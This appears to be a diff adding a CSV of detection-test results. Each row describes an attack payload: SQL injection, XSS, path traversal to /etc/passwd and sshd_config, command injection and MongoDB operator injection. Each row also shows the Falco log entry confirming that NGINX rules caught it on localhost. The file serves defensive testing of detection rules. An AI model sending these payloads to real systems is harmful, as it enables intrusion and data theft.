@@ -1,0 +1,3101 @@
+"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_BOOL_005` |
+| **Name** | Double quote boolean injection |
+| **Category** | SQLI |
+| **Subcategory** | boolean_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `"" OR ""1""=""1`
+- **Encoded**: `%22%20OR%20%221%22%3D%221`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~14000ms
+- **Timestamp**: 15:09:23.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1765465763360-a2pzwq pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:23.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1765465763360-a2pzwq pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[005_SQLI_BOOL_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_UNICODE_002` |
+| **Name** | UTF-8 overlong encoding |
+| **Category** | PATH |
+| **Subcategory** | unicode_encoding |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `..%c0%ae%c0%ae/etc/passwd`
+- **Encoded**: `..%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~3000ms
+- **Timestamp**: 15:09:34.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_002-1765465774358-4zhulx pattern_id=PATH_UNICODE_002 uri=/?q=..%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:34.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_002-1765465774358-4zhulx pattern_id=PATH_UNICODE_002 uri=/?q=..%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1
+```","1","test_e2e_with_logs[075_PATH_UNICODE_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_UNION_002` |
+| **Name** | UNION ALL SELECT with multiple NULLs |
+| **Category** | SQLI |
+| **Subcategory** | union_based |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `UNION ALL SELECT NULL,NULL`
+- **Encoded**: `UNION%20ALL%20SELECT%20NULL%2CNULL`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~12000ms
+- **Timestamp**: 15:09:25.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1765465765364-8yti06 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:25.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1765465765364-8yti06 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[029_SQLI_UNION_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_007` |
+| **Name** | Select onfocus XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<select onfocus=alert('XSS') autofocus>`
+- **Encoded**: `%3Cselect%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~17000ms
+- **Timestamp**: 15:09:20.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_007-1765465760337-eon4t pattern_id=XSS_REFL_007 uri=/?q=%3Cselect%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:20.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_REFL_007-1765465760337-eon4t pattern_id=XSS_REFL_007 uri=/?q=%3Cselect%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[042_XSS_REFL_007]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_011` |
+| **Name** | Basic pipe with id command |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `|id`
+- **Encoded**: `%7Cid`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~5000ms
+- **Timestamp**: 15:09:32.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1765465772342-4rzzpf pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:32.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1765465772342-4rzzpf pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1
+```","1","test_e2e_with_logs[085_CMD_BASIC_011]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `EMRG_MONGO_003` |
+| **Name** | MongoDB greater-than bypass |
+| **Category** | OTHER |
+| **Subcategory** | mongodb_injection |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `{""$gt"": """"}`
+- **Encoded**: `%7B%22%24gt%22%3A%20%22%22%7D`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~4000ms
+- **Timestamp**: 15:09:33.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1765465773332-v3l7ll pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:33.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_003-1765465773332-v3l7ll pattern_id=EMRG_MONGO_003 uri=/?q=%7B%22%24gt%22%3A%20%22%22%7D client=127.0.0.1
+```","1","test_e2e_with_logs[098_EMRG_MONGO_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_ENC_001` |
+| **Name** | HTML entity encoded script tag |
+| **Category** | XSS |
+| **Subcategory** | encoding_bypass |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `&#60;script&#62;alert(1)&#60;/script&#62;`
+- **Encoded**: `%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~13000ms
+- **Timestamp**: 15:09:24.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_ENC_001-1765465764847-4qwhd4 pattern_id=XSS_ENC_001 uri=/?q=%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:24.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=XSS_ENC_001-1765465764847-4qwhd4 pattern_id=XSS_ENC_001 uri=/?q=%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[033_XSS_ENC_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_UNICODE_001` |
+| **Name** | Unicode slash encoding |
+| **Category** | PATH |
+| **Subcategory** | unicode_encoding |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `..%c0%afetc/passwd`
+- **Encoded**: `..%25c0%25afetc%2Fpasswd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~4000ms
+- **Timestamp**: 15:09:33.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1765465773857-fiv1xj pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:33.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1765465773857-fiv1xj pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1
+```","1","test_e2e_with_logs[074_PATH_UNICODE_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_003` |
+| **Name** | OR operator with id command |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `|| id`
+- **Encoded**: `%7C%7C%20id`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~9000ms
+- **Timestamp**: 15:09:28.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1765465768332-mcaoo8 pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:28.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1765465768332-mcaoo8 pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1
+```","1","test_e2e_with_logs[077_CMD_BASIC_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `EMRG_MONGO_002` |
+| **Name** | MongoDB not-equal operator bypass |
+| **Category** | OTHER |
+| **Subcategory** | mongodb_injection |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `{""$ne"": null}`
+- **Encoded**: `%7B%22%24ne%22%3A%20null%7D`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~5000ms
+- **Timestamp**: 15:09:32.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1765465772831-7ksk9o pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:32.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1765465772831-7ksk9o pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1
+```","1","test_e2e_with_logs[097_EMRG_MONGO_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_ERR_002` |
+| **Name** | MySQL UPDATEXML error-based |
+| **Category** | SQLI |
+| **Subcategory** | error_based |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `UPDATEXML(1,CONCAT(0x7e,version()),1)`
+- **Encoded**: `UPDATEXML(1%2CCONCAT(0x7e%2Cversion())%2C1)`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~11000ms
+- **Timestamp**: 15:09:26.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERR_002-1765465766367-0ey3bc pattern_id=SQLI_ERR_002 uri=/?q=UPDATEXML(1%2CCONCAT(0x7e%2Cversion())%2C1) client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:26.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERR_002-1765465766367-0ey3bc pattern_id=SQLI_ERR_002 uri=/?q=UPDATEXML(1%2CCONCAT(0x7e%2Cversion())%2C1) client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[009_SQLI_ERR_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_ENC_001` |
+| **Name** | URL encoded dot-dot-slash |
+| **Category** | PATH |
+| **Subcategory** | encoded_traversal |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `%2e%2e%2fetc/passwd`
+- **Encoded**: `%252e%252e%252fetc%2Fpasswd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~5000ms
+- **Timestamp**: 15:09:32.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_001-1765465772353-h8pbbn pattern_id=PATH_ENC_001 uri=/?q=%252e%252e%252fetc%2Fpasswd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:32.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_001-1765465772353-h8pbbn pattern_id=PATH_ENC_001 uri=/?q=%252e%252e%252fetc%2Fpasswd client=127.0.0.1
+```","1","test_e2e_with_logs[071_PATH_ENC_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_BOOL_006` |
+| **Name** | Numeric comparison injection |
+| **Category** | SQLI |
+| **Subcategory** | boolean_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `1 AND 1>0`
+- **Encoded**: `1%20AND%201%3E0`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~14000ms
+- **Timestamp**: 15:09:23.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1765465763861-6n51v pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:23.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1765465763861-6n51v pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[006_SQLI_BOOL_006]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_001` |
+| **Name** | Basic script tag XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<script>alert('XSS')</script>`
+- **Encoded**: `%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~20000ms
+- **Timestamp**: 15:09:17.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1765465757329-guf5xc pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:17.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1765465757329-guf5xc pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[036_XSS_REFL_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_005` |
+| **Name** | Extended sleep duration |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `SLEEP(10)`
+- **Encoded**: `SLEEP%2810%29`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~23000ms
+- **Timestamp**: 15:09:14.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_005-1765465754335-7f621g pattern_id=SQLI_TIME_005 uri=/?q=SLEEP%2810%29 client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:14.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_005-1765465754335-7f621g pattern_id=SQLI_TIME_005 uri=/?q=SLEEP%2810%29 client=127.0.0.1 method=GET
+```","3","test_e2e_with_logs[014_SQLI_TIME_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_DOT_005` |
+| **Name** | SSH config access via traversal |
+| **Category** | PATH |
+| **Subcategory** | dot_dot_slash |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../../../../../etc/ssh/sshd_config`
+- **Encoded**: `../../../../../etc/ssh/sshd_config`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~11000ms
+- **Timestamp**: 15:09:26.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_005-1765465766841-v377k pattern_id=PATH_DOT_005 uri=/?q=../../../../../etc/ssh/sshd_config client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:26.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_005-1765465766841-v377k pattern_id=PATH_DOT_005 uri=/?q=../../../../../etc/ssh/sshd_config client=127.0.0.1
+```","1","test_e2e_with_logs[065_PATH_DOT_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_BASIC_005` |
+| **Name** | Deep parent directory traversal |
+| **Category** | PATH |
+| **Subcategory** | basic_traversal |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `../../../../../`
+- **Encoded**: `../../../../../`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~13000ms
+- **Timestamp**: 15:09:24.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_005-1765465764334-ujaev pattern_id=PATH_BASIC_005 uri=/?q=../../../../../ client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:24.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_005-1765465764334-ujaev pattern_id=PATH_BASIC_005 uri=/?q=../../../../../ client=127.0.0.1
+```","1","test_e2e_with_logs[060_PATH_BASIC_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `XSS_REFL_011` |
+| **Name** | Audio onerror XSS |
+| **Category** | XSS |
+| **Subcategory** | reflected_xss |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `<audio src=x onerror=alert('XSS')>`
+- **Encoded**: `%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~15000ms
+- **Timestamp**: 15:09:22.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_011-1765465762342-dtl6s pattern_id=XSS_REFL_011 uri=/?q=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:22.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_011-1765465762342-dtl6s pattern_id=XSS_REFL_011 uri=/?q=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
+```","2","test_e2e_with_logs[046_XSS_REFL_011]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_019` |
+| **Name** | URL encoded newline injection |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `%0als`
+- **Encoded**: `%250als`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~1000ms
+- **Timestamp**: 15:09:36.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1765465776353-qss2re pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:36.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1765465776353-qss2re pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1
+```","1","test_e2e_with_logs[093_CMD_BASIC_019]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_010` |
+| **Name** | Disk space information |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `MEDIUM` |
+
+## Attack Details
+
+- **Payload**: `&& df -h`
+- **Encoded**: `%26%26%20df%20-h`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~6000ms
+- **Timestamp**: 15:09:31.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_010-1765465771840-jwiqq pattern_id=CMD_BASIC_010 uri=/?q=%26%26%20df%20-h client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:31.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_010-1765465771840-jwiqq pattern_id=CMD_BASIC_010 uri=/?q=%26%26%20df%20-h client=127.0.0.1
+```","1","test_e2e_with_logs[084_CMD_BASIC_010]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `SQLI_TIME_016` |
+| **Name** | MySQL BENCHMARK with large iterations |
+| **Category** | SQLI |
+| **Subcategory** | time_based_blind |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `BENCHMARK(10000000,MD5('a'))`
+- **Encoded**: `BENCHMARK(10000000%2CMD5('a'))`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~16000ms
+- **Timestamp**: 15:09:21.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1765465761856-wv5c7o pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET
+
+**Falco Log Entry**:
+```
+15:09:21.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1765465761856-wv5c7o pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET
+```","1","test_e2e_with_logs[025_SQLI_TIME_016]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_007` |
+| **Name** | Network information gathering |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `&& netstat -an`
+- **Encoded**: `%26%26%20netstat%20-an`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~7000ms
+- **Timestamp**: 15:09:30.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1765465770337-inn7ph pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:30.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1765465770337-inn7ph pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1
+```","2","test_e2e_with_logs[081_CMD_BASIC_007]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_013` |
+| **Name** | Semicolon with pwd command |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `CRITICAL` |
+
+## Attack Details
+
+- **Payload**: `;pwd`
+- **Encoded**: `%3Bpwd`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~4000ms
+- **Timestamp**: 15:09:33.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1765465773344-arph84 pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:33.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1765465773344-arph84 pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1
+```","1","test_e2e_with_logs[087_CMD_BASIC_013]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `CMD_BASIC_006` |
+| **Name** | System information gathering |
+| **Category** | CMDINJ |
+| **Subcategory** | basic_command_injection |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
+- **Payload**: `; uname -a`
+- **Encoded**: `%3B%20uname%20-a`
+- **Expected Detection**: Yes
+
+## Test Execution Results
+
+- **Status**: `PASSED`
+- **Detection Count**: 1 / 1
+- **Latency**: ~8000ms
+- **Timestamp**: 15:09:29.000 UTC
+
+## Detection Evidence
+
+**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_006-1765465769836-5pbmf pattern_id=CMD_BASIC_006 uri=/?q=%3B%20uname%20-a client=127.0.0.1
+
+**Falco Log Entry**:
+```
+15:09:29.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_006-1765465769836-5pbmf pattern_id=CMD_BASIC_006 uri=/?q=%3B%20uname%20-a client=127.0.0.1
+```","1","test_e2e_with_logs[080_CMD_BASIC_006]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
+"## Attack Pattern Information
+
+| Item | Value |
+|------|-------|
+| **Pattern ID** | `PATH_BASIC_004` |
+| **Name** | Quadruple parent directory traversal |
+| **Category** | PATH |
+| **Subcategory** | basic_traversal |
+| **Severity** | `HIGH` |
+
+## Attack Details
+
